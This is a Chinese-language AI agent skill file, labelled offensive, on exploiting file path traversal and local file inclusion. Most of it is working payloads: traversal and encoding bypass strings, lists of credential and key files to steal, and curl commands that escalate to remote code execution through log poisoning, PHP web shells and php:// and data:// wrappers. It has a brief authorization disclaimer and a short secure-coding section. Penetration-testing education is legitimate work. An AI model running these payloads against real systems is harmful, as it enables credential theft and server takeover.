---
name: file-path-traversal
description: >
  识别并利用文件路径遍历（目录遍历）漏洞，使攻击者能在服务器上读取任意文件，可能包括敏感配置文件、凭证和源代码。触发词：路径遍历、目录遍历、LFI、文件包含漏洞、path traversal、../。
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **仅限授权使用**：本技能仅用于授权安全评估、防御性验证或受控教学环境。

# 文件路径遍历测试

## 目的

识别并利用文件路径遍历（目录遍历）漏洞，使攻击者能在服务器上读取任意文件，可能包括敏感配置文件、凭证和源代码。此漏洞发生在用户可控输入未经验证即传递给文件系统 API 时。

## 前置条件

### 所需工具

- 带开发者工具的 Web 浏览器
- Burp Suite 或 OWASP ZAP
- 用于测试 payload 的 cURL
- 用于自动化的字典
- 用于模糊测试的 ffuf 或 wfuzz

### 所需知识

- HTTP 请求/响应结构
- Linux 和 Windows 文件系统布局
- Web 应用架构
- 文件 API 基础知识

## 输出与交付

1. **漏洞报告** —— 已识别的遍历点与严重程度
2. **利用证明** —— 提取的文件内容
3. **影响评估** —— 可访问的文件与数据暴露
4. **修复指导** —— 安全编码建议

## 核心工作流

### 阶段 1：理解路径遍历

当应用使用用户输入构造文件路径时，路径遍历发生：

```php
// 易受攻击的 PHP 代码示例
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

攻击原理：
- `../` 序列上移一级目录
- 链式多个序列到达根
- 访问预期目录之外的文件

影响：
- **机密性** —— 读取敏感文件
- **完整性** —— 写入/修改文件（某些情况下）
- **可用性** —— 删除文件（某些情况下）
- **代码执行** —— 如果与文件上传或日志投毒结合

### 阶段 2：识别遍历点

绘制应用的文件操作潜在点：

```bash
# 经常处理文件的参数
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

常见易受攻击功能：
- 图片加载：`/image?filename=23.jpg`
- 模板选择：`?template=blue.php`
- 文件下载：`/download?file=report.pdf`
- 文档查看器：`/view?doc=manual.pdf`
- 包含机制：`?page=about`

### 阶段 3：基本利用技术

#### 简单路径遍历

```bash
# 基本 Linux 遍历
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows 遍历
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL 编码
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # 双重编码

# 用 curl 测试 payload
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### 绝对路径注入

```bash
# 直接绝对路径（Linux）
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# 直接绝对路径（Windows）
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### 阶段 4：绕过技术

#### 绕过被剥离的遍历序列

```bash
# 当 ../ 被剥离一次
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# 嵌套遍历
..././..././..././etc/passwd
....//....//etc/passwd

# 混合编码
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### 绕过扩展名校验

```bash
# 空字节注入（旧版 PHP）
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# 路径截断
../../../etc/passwd...............................

# 双扩展名
../../../etc/passwd.jpg.php
```

#### 绕过基础目录校验

```bash
# 当路径必须以预期目录开头
/var/www/images/../../../etc/passwd

# 预期路径后接遍历
images/../../../etc/passwd
```

#### 绕过黑名单过滤

```bash
# Unicode/UTF-8 编码
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# 超长 UTF-8 编码
%c0%2e%c0%2e%c0%af

# URL 编码变体
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# 大小写变体（Windows）
....\\....\\etc\\passwd
```

### 阶段 5：Linux 目标文件

高价值文件：

```bash
# 系统文件
/etc/passwd           # 用户账户
/etc/shadow           # 密码哈希（仅 root）
/etc/group            # 组信息
/etc/hosts            # 主机映射
/etc/hostname         # 系统主机名
/etc/issue            # 系统横幅

# SSH 文件
/root/.ssh/id_rsa           # Root 私钥
/root/.ssh/authorized_keys  # 授权密钥
/home/<user>/.ssh/id_rsa    # 用户私钥
/etc/ssh/sshd_config        # SSH 配置

# Web 服务器文件
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# 应用文件
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# 进程信息
/proc/self/environ      # 环境变量
/proc/self/cmdline      # 进程命令行
/proc/self/fd/0         # 文件描述符
/proc/version           # 内核版本

# 常见应用配置
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### 阶段 6：Windows 目标文件

Windows 特定目标：

```bash
# 系统文件
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# IIS 文件
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# 配置文件
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# 用户文件
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### 阶段 7：自动化测试

#### 使用 Burp Suite

```
1. 用文件参数捕获请求
2. 发送到 Intruder
3. 标记文件参数值为 payload 位置
4. 加载路径遍历字典
5. 启动攻击
6. 按大小/内容过滤响应以确定成功
```

#### 使用 ffuf

```bash
# 基本遍历模糊测试
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# 带编码的模糊测试
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### 使用 wfuzz

```bash
# 遍历到 /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# 带 headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### 阶段 8：LFI 升级到 RCE

#### 日志投毒

```bash
# 注入 PHP 代码到日志
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 包含 Apache 日志文件
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# 包含 auth.log（SSH）
# 首先：ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# 通过 User-Agent 注入
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# 带命令参数
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP 包装器利用

```bash
# php://filter - 以 base64 读取源代码
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - 将 POST 数据作为 PHP 执行
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - 执行内联 PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - 执行系统命令
curl "http://target.com/page?file=expect://id"
```

### 阶段 9：测试方法论

结构化测试方法：

```bash
# 步骤 1：识别潜在参数
# 寻找文件相关功能

# 步骤 2：测试基本遍历
../../../etc/passwd

# 步骤 3：测试编码变体
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 步骤 4：测试绕过技术
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# 步骤 5：测试绝对路径
/etc/passwd

# 步骤 6：用空字节测试（旧版）
../../../etc/passwd%00.jpg

# 步骤 7：尝试包装器利用
php://filter/convert.base64-encode/resource=index.php

# 步骤 8：尝试日志投毒以获取 RCE
```

### 阶段 10：预防措施

安全编码实践：

```php
// PHP：使用 basename() 剥离路径
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP：对照白名单验证
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP：规范化并验证基础路径
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python：使用 os.path.realpath() 并验证
import os

def safe_file_access(base_dir, filename):
    # 解析为绝对路径
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))

    # 验证文件在基础目录内
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("访问被拒")
```

## 速查

### 常见 Payload

| Payload | 目标 |
|---------|--------|
| `../../../etc/passwd` | Linux 密码文件 |
| `..\..\..\..\windows\win.ini` | Windows INI 文件 |
| `....//....//....//etc/passwd` | 绕过简单过滤 |
| `/etc/passwd` | 绝对路径 |
| `php://filter/convert.base64-encode/resource=config.php` | 源代码 |

### 目标文件

| OS | 文件 | 用途 |
|----|------|---------|
| Linux | `/etc/passwd` | 用户账户 |
| Linux | `/etc/shadow` | 密码哈希 |
| Linux | `/proc/self/environ` | 环境变量 |
| Windows | `C:\windows\win.ini` | 系统配置 |
| Windows | `C:\boot.ini` | 启动配置 |
| Web | `wp-config.php` | WordPress DB 凭证 |

### 编码变体

| 类型 | 示例 |
|------|---------|
| URL 编码 | `%2e%2e%2f` = `../` |
| 双重编码 | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| 空字节 | `%00` |

## 约束与限制

### 权限限制

- 无法读取应用用户无权访问的文件
- shadow 文件需要 root 权限
- 许多文件具有限制性权限

### 应用限制

- 扩展名校验可能限制文件类型
- 基础路径校验可能限制范围
- WAF 可能阻止常见 payload

### 测试注意事项

- 遵守授权范围
- 避免访问真正敏感的数据
- 记录所有成功访问

## 故障排查

| 问题 | 解决方案 |
|---------|-----------|
| 无响应差异 | 尝试编码、盲遍历、不同文件 |
| Payload 被阻止 | 使用编码变体、嵌套序列、大小写变体 |
| 无法升级到 RCE | 检查日志、PHP 包装器、文件上传、会话投毒 |

## 何时使用

本技能适用于执行上述工作流或动作。
